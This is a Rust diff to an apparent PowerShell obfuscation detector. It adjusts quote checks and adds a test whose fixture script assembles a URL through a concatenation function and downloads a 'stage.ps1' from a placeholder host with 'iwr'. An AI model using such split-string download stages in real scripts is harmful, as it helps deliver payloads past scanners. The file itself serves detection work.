@@ -8199,13 +8199,13 @@ impl PsObfuscationSignals {
                 || lower.contains("string]::join")
                 || lower.contains("string]::format")
                 || lower.contains("-f"))
-            && text.contains('\'');
+            && has_static_ps_literal_quote(text);
         let literal_index_extractor = has_function_def
             && (lower.contains('[')
                 || lower.contains(".chars")
                 || lower.contains(".get_chars")
                 || lower.contains(".tochararray"))
-            && text.contains('\'');
+            && has_static_ps_literal_quote(text);
         let split_index =
             has_function_def && has_split_index_extractor_signal(&lower) && text.contains('[');
         let embedded_single_quote_assignment = has_embedded_single_quote_assignment_signal(text);
@@ -10461,6 +10461,29 @@ iwr $url"#;
                     if src == "https://ps-remove-var-url.example/stage.ps1"
             )),
             "PS remove-extractor URL was not surfaced as a download: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn literal_concat_extractor_double_quoted_variable_url_is_scanned_as_download() {
+        let script = br#"function Join-Text($left,$right) {
+  return $left + $right
+}
+$url = Join-Text "https://ps-concat-var-url.example" "/stage.ps1"
+iwr $url"#;
+        let mut env = Environment::new(&Config::default());
+        env.all_extracted_ps1.push(script.to_vec());
+
+        super::scan_ps1_payloads(&mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://ps-concat-var-url.example/stage.ps1"
+            )),
+            "PS concat-extractor URL was not surfaced as a download: {:?}",
             env.traits
         );
     }
